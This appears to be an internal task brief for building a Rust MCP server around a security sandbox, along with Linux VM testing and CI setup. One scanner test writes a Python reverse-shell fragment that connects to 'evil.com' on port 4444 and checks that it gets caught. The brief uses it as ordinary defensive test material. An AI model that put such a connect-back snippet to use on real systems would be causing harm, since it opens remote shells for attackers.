# Sandbox MCP — Task for Sayan

## Overview

Build an MCP (Model Context Protocol) server that wraps the existing `UNIT-01/sandbox` security cage into a standardized tool interface. Currently the sandbox is a CLI binary (`sandbox cage`, `sandbox daemon`, `sandbox rollback`). You need to expose its capabilities as MCP tools so the orchestrator can call them programmatically via the MCP protocol.

## Current State

The sandbox exists at `UNIT-01/sandbox/src/` with these modules:

| Module | What it does |
|---|---|
| `cage/` | Kernel-isolated execution environment (Landlock on Linux, seatbelt on macOS) |
| `shadow/` | Filesystem rollback — snapshots files before sandbox writes, can restore on rollback |
| `runner/` | Code execution orchestrator — compiles, runs, captures output |
| `scanner/` | Malicious code scanner (regex-based, pattern matching) |
| `threat/` | Threat intelligence analysis |
| `classifier/` | Classifies input types (code, shell, SQL, etc.) |
| `config/` | Configuration loading |
| `socket/` | Basic socket listener (daemon mode) |
| `intercept/` | PRO feature — syscall interception |
| `watchdog/` | PRO feature — process monitoring |

The PRO sandbox at `PRO/sandbox/` adds:
- `gate.rs` — Pre-execution security gate (validates tool calls against policy before fork)
- `intercept/` — Syscall interception and quarantine
- `scanner/` — Advanced scanning
- `threat/` — Threat analysis
- `tui/` — Terminal UI components
- `watchdog/` — Process watchdog
- `archive.rs` — Session archiving
- `wasm.rs` — WASM support

## What to Build

### 1. MCP Server (`sandbox-mcp`)

Create a new crate at `UNIT-01/sandbox-mcp/` that:
- Starts an MCP-compatible stdio or socket server
- Registers these tools:

```
sandbox_execute   → Execute code in the security cage
  args:
    - code: string (the code to execute)
    - language: enum (python, rust, shell, javascript, go, etc.)
    - mode: enum (run, review, sandboxed) — defaults to "sandboxed"
    - fuel: int (optional, max execution steps)
  returns: { stdout, stderr, exit_code, duration_ms, session_id }

sandbox_rollback  → Rollback filesystem changes from a session
  args:
    - session_id: string
    - dry_run: bool (preview without restoring)
  returns: { restored_count, failed_count, files[] }

sandbox_list_sessions → List available rollback sessions
  returns: { sessions: [{ session_id, created, file_count }] }

sandbox_clear_session → Clear a rollback session
  args:
    - session_id: string
  returns: { success: bool }

sandbox_policy_check → Check if an action is allowed by security policy
  args:
    - action: string (read, write, execute, network)
    - path: string (optional, filesystem path)
    - category: string (code, shell, file, network, system)
  returns: { allowed: bool, reason: string, risk_level: string }

sandbox_scan    → Scan code for malicious patterns
  args:
    - code: string
    - language: string (optional)
  returns: { threats: [{ pattern, severity, line }], safe: bool }
```

### 2. Dependencies

Use the MCP Rust SDK (`mcp-sdk` or `mcp-core`) to implement the protocol. The server communicates via **stdio** (stdin/stdout JSON-RPC 2.0) so the orchestrator can spawn it as a child process.

Add to `Cargo.toml`:
```toml
[dependencies]
sandbox = { path = "../sandbox" }
mcp-sdk = "0.1" # or whatever the Rust MCP SDK is called
tokio = { version = "1", features = ["full"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
anyhow = "1"
tracing = "0.1"
```

### 3. Architecture

```
orchestrator
  └── spawns ──> sandbox-mcp (stdio MCP server)
                    └── calls ──> sandbox::cage::run_cage(...)
                    └── calls ──> sandbox::shadow::RollbackManager
                    └── calls ──> sandbox::scanner::scan(...)
```

The sandbox-mcp wraps existing sandbox functions — do NOT reimplement the cage, shadow, or scanner. Import them from the `sandbox` crate.

### 4. MCP Tool Registration (example pseudocode)

```rust
use mcp_sdk::server::Server;
use mcp_sdk::tool::Tool;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let server = Server::new("sandbox-mcp", "0.1.0");

    server.register_tool(
        Tool::new("sandbox_execute")
            .description("Execute code in the security cage")
            .arg("code", String::desc("Code to execute"))
            .arg("language", String::desc("Language (python, rust, shell, js, go)"))
            .arg("mode", String::desc("run|review|sandboxed").default("sandboxed"))
            .handler(|args| {
                let code = args.get("code")?;
                let mode = args.get("mode").unwrap_or("sandboxed");
                // Call sandbox::cage::run_cage(...)
                Ok(json!({ "stdout": ..., "stderr": ..., "exit_code": ... }))
            })
    );

    server.listen_stdio().await?;
    Ok(())
}
```

### 5. PRO Features (if licensed)

The PRO sandbox tools (`PRO/sandbox/`) should be registered separately behind a `pro` feature flag:

```rust
#[cfg(feature = "pro")]
{
    // Register PRO tools: sandbox_gate_check, sandbox_watchdog_start, sandbox_quarantine, etc.
}
```

### 6. Testing

- Unit test each tool handler with a mocked sandbox
- Integration test: spawn sandbox-mcp, connect via MCP client, call `sandbox_execute` with `print("hello")`, verify output
- Test rollback: execute a file-write, rollback, verify file restored
- Test scanning: feed known-bad patterns, verify detection

### 7. Example Usage from Orchestrator

```rust
// In the orchestrator, spawning sandbox-mcp:
let mcp_config = mcp::MCPConfig {
    name: "sandbox-mcp",
    command: "sandbox-mcp",
    args: vec![],
    transport: "stdio",
};
mcp_mgr.register_tool_provider("sandbox", mcp_config).await;
```

The orchestrator's `mcp.rs` already handles MCP tool discovery and calling. Your server just needs to register tools and respond to `tools/call` requests.

---

## Task 8: VM Testing (Linux)

The sandbox uses **Linux kernel security primitives** (`landlock`, `libseccomp`). These are **Linux-only** and won't work in CI on macOS runners. You need a proper VM testing pipeline.

### 8.1 Provision a Linux VM

Set up a Linux VM environment:

**Option A: Lima (preferred for macOS dev)**
- Use [Lima](https://lima-vm.io/) — `brew install lima`
- Provision an Ubuntu 24.04 VM: `limactl create template://ubuntu-24.04 --name ruthen-test`
- Mount the repo: `limactl mount ruthen-test /Users/lichi/Documents/new build/Ruthen-Labs`
- Shell in: `limactl shell ruthen-test`

**Option B: OrbStack**
- If you have OrbStack, it's faster than Lima
- Create an Ubuntu 24.04 instance
- Same workflow (mount + shell)

**Option C: Vagrant (if you prefer)**
- Create a `Vagrantfile` at the workspace root:
  ```ruby
  Vagrant.configure("2") do |config|
    config.vm.box = "ubuntu/jammy64"
    config.vm.provider "parallels" do |p|
      p.memory = 8192
      p.cpus = 4
    end
    config.vm.synced_folder ".", "/ruthen-labs"
    config.vm.provision "shell", inline: <<-SHELL
      apt-get update
      apt-get install -y build-essential pkg-config libssl-dev
      curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
    SHELL
  end
  ```

### 8.2 What to Test in the VM

#### A. Landlock cage tests (the big one)
```bash
# Full sandbox test suite on real Linux kernel
limactl shell ruthen-test
cd /ruthen-labs/UNIT-01/sandbox
cargo test -- --test-threads=1
```

Pay attention to these test modules — they exercise kernel-security paths:
- `cage::sandbox` — Landlock ruleset, path restrictions, network sandboxing
- `cage::cgroups` — CPU/memory cgroup limits
- `cage::policy` — Security policy evaluation
- `cage::gate` — Pre-execution gate (syscall allow/deny with seccomp)
- `runner::heuristic` — Heuristic-based run detection

#### B. Seccomp syscall filtering
```bash
# Test that disallowed syscalls are blocked
cargo test cage::gate::tests::blocked_syscall_returns_error
cargo test cage::gate::tests::allowed_syscall_succeeds
```

#### C. Cgroup resource limits
```bash
# Test that OOM and CPU limits are enforced
cargo test cage::cgroups::tests::memory_limit_enforced
cargo test cage::cgroups::tests::cpu_quota_enforced
```

#### D. Rollback on real filesystem
```bash
# Shadow rollback creates real temp files — test on ext4/btrfs
cargo test shadow::rollback::tests
```

#### E. Full MCP integration in VM
```bash
# Build sandbox-mcp inside the VM
cd /ruthen-labs/UNIT-01/sandbox-mcp
cargo build

# Start the MCP server
./target/debug/sandbox-mcp &

# Test with a simple MCP client (or the orchestrator)
# sandbox_execute — runs code in the real Landlock cage
# sandbox_rollback — restores filesystem state
# sandbox_scan — detects malicious patterns
```

#### F. Malicious code detection (running in cage)
```bash
# Test scanner with known malicious patterns
cargo test scanner::dirscan::tests
cargo test scanner::entropy::tests

# Manually test: feed a simple reverse shell, verify it's caught
echo 'import socket; s=socket.socket(); s.connect(("evil.com",4444))' > /tmp/test_scan.py
./target/debug/sandbox cage /tmp/test_scan.py --mode review
# Expected: threat detected, blocked
```

#### G. Performance benchmarks in VM
```bash
# Measure cage overhead — how fast is code inside vs outside?
# Run the existing bench-like tests (or add a benchmark binary)
cargo test --release cage::sandbox::tests::bench_execution_time -- --nocapture
```

### 8.3 VM CI Integration

Once the VM workflow is solid, create CI configs:

#### GitHub Actions (`.github/workflows/ci.yml`)
```yaml
name: CI
on: [push, pull_request]

jobs:
  macos:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo build --workspace
      - run: cargo test --workspace --exclude sandbox  # skip Linux-only tests

  linux:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: sudo apt-get install -y pkg-config libssl-dev
      - run: cargo build --workspace
      - run: cargo test --workspace
```

#### Local VM Script (optional)
Create `scripts/vm-test.sh`:
```bash
#!/bin/bash
set -euo pipefail

VM_NAME="${1:-ruthen-test}"

echo "=== Building in VM ==="
limactl shell "$VM_NAME" bash -c "
  cd /ruthen-labs &&
  cargo build --workspace 2>&1
"

echo "=== Running tests in VM ==="
limactl shell "$VM_NAME" bash -c "
  cd /ruthen-labs &&
  cargo test --workspace -- --test-threads=1 2>&1
"

echo "=== MCP integration test ==="
limactl shell "$VM_NAME" bash -c "
  cd /ruthen-labs/UNIT-01/sandbox-mcp &&
  cargo build &&
  ./target/debug/sandbox-mcp &
  sleep 1
  # Run MCP client test
"
```

---

## Task 9: CI/CD Pipeline

### 9.1 GitHub Actions (create `.github/workflows/ci.yml`)

```yaml
name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  CARGO_TERM_COLOR: always

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
        with:
          components: clippy, rustfmt
      - run: cargo fmt --check
      - run: cargo clippy --workspace -- -D warnings

  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: sudo apt-get install -y pkg-config libssl-dev
      - run: cargo build --workspace

  test-linux:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: sudo apt-get install -y pkg-config libssl-dev
      - run: cargo test --workspace

  test-macos:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      # Skip sandbox tests on macOS (Landlock/seccomp not available)
      - run: cargo test --workspace --exclude sandbox

  integration:
    runs-on: ubuntu-latest
    needs: [build]
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: sudo apt-get install -y pkg-config libssl-dev
      - run: cargo build --workspace
      - name: Start sandbox daemon
        run: |
          ./target/debug/sandbox daemon &
          sleep 2
      - name: Start orchestrator
        run: |
          ./target/debug/orchestrator --headless &
          sleep 2
      - name: MCP tool call test
        run: |
          # Test sandbox_execute via MCP
          echo '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"sandbox_execute","arguments":{"code":"print(42)","language":"python"}},"id":1}' | \
          ./target/debug/sandbox-mcp | grep -q '"content"'
```

### 9.2 Pre-commit Hook

Create `.githooks/pre-commit`:
```bash
#!/bin/bash
set -euo pipefail

echo "=== Running cargo fmt ==="
cargo fmt --check

echo "=== Running cargo clippy ==="
cargo clippy --workspace -- -D warnings

echo "=== Running tests (excluding sandbox on macOS) ==="
if [[ "$(uname)" == "Darwin" ]]; then
  cargo test --workspace --exclude sandbox
else
  cargo test --workspace
fi
```

Install it: `git config core.hooksPath .githooks`

---

## Success Criteria

- `cargo run` starts an MCP stdio server that accepts JSON-RPC 2.0
- `sandbox_execute` runs Python/Rust/Shell code in the cage and returns output
- `sandbox_rollback` restores filesystem state
- `sandbox_scan` detects malicious patterns
- Integration test passes
- All existing sandbox tests still pass

## References

- MCP Specification: https://spec.modelcontextprotocol.io
- Existing sandbox code: `UNIT-01/sandbox/src/`
- Existing PRO sandbox: `PRO/sandbox/`
- Orchestrator MCP integration: `orchestrator/src/mcp.rs`
- Sandbox CLI entrypoint: `UNIT-01/sandbox/src/main.rs`
